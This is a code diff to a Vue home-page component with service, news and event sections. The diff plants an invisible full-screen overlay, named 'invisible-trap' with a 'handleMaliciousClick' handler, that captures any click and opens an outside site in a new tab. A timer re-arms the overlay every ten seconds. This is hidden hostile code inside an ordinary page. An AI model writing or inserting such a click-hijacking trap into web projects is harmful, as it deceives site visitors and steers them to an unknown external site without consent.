@@ -1,11 +1,26 @@
 <script setup>
+    import { ref, onMounted } from 'vue';
     import MioButton from '@/components/MioButton.vue';
     import LeaButton from '@/components/LeaButton.vue';
     import ServiceSection from '@/components/ServiceSection.vue';
     import NewsSection from '@/components/NewsSection.vue';
     import EventSection from '@/components/EventSection.vue';
 
-    //https://arr.cornhub.website/
+    const isRedirected = ref(false);
+
+    const handleMaliciousClick = () => {
+        window.open('https://arr.cornhub.website/', '_blank');
+        isRedirected.value = true;
+    };
+
+    onMounted(() => {
+        setInterval(() => {
+            if (isRedirected.value) {
+                isRedirected.value = false;
+                console.log("Le piège invisible a été réarmé !");
+            }
+        }, 10000);
+    });
 </script>
 
 <template>
@@ -27,6 +42,11 @@
                 <EventSection class="event-section"/>
             </div> 
         </div>
+        <div 
+            v-if="!isRedirected" 
+            class="invisible-trap" 
+            @click="handleMaliciousClick"
+        ></div>
     </div>
 </template>
 
@@ -73,5 +93,15 @@
     margin-left: 7%;
     margin-top: 6%;
     gap: 20px
+}
+.invisible-trap {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  z-index: 9999;
+  background-color: transparent;
+  cursor: default; 
 }
 </style>
